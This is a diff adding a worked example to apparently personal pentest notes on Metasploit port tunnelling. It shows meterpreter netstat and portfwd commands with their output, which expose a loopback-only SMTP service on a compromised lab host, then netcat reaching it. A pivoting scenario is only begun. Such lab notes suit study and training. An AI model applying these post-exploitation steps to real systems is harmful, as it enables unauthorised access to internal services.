@@ -1,12 +1,44 @@
 # Metasploit Port Tunneling for exploitation
 
 ## Scenario 1: 
-- The service of my target machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:3306. It does not serve at 0.0.0.0:3306.
+- The service of my target machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:25. It does not serve at 0.0.0.0:25.
 - I have an active meterpreter session for this machine.
+- my host machine is at 10.10.1.32.
 
-Technique: Local Port Forwarding via meterpreter portfwd
+Technique: Local Port Forwarding via meterpreter portfwd.
 
-(TODO)
+```sh
+meterpreter > netstat
+
+Connection list
+===============
+
+    Proto  Local address     Remote address   State        User  Inode  PID/Program name
+    -----  -------------     --------------   -----        ----  -----  ----------------
+    tcp    127.0.0.1:25      0.0.0.0:*        LISTEN       0     0
+    tcp    10.10.1.10:46242  10.10.1.32:443   ESTABLISHED  0     0
+
+meterpreter > portfwd add -l 2525 -p 25 -r 127.0.0.1
+[*] Forward TCP relay created: (local) :2525 -> (remote) 127.0.0.1:25
+meterpreter > portfwd list
+
+Active Port Forwards
+====================
+
+   Index  Local         Remote        Direction
+   -----  -----         ------        ---------
+   1      0.0.0.0:2525  127.0.0.1:25  Forward
+
+1 total active port forwards.
+```
+This will set up a listening port on my host machine at port 2525, which will forward the traffic to 127.0.0.1:25 on the target's machine.
+```sh
+nc -nv 127.0.0.1 2525
+(UNKNOWN) [127.0.0.1] 2525 (?) open
+220 WELCOME TO ESMTP
+^C
+```
+I was able to talk to the SMTP server that was at the 127.0.0.1 interface.
 
 ## Scenario 2: 
 - I have exploited a machine (10.10.1.10) that has access to another internal admin network on another network interface eth2 (172.16.1.10).
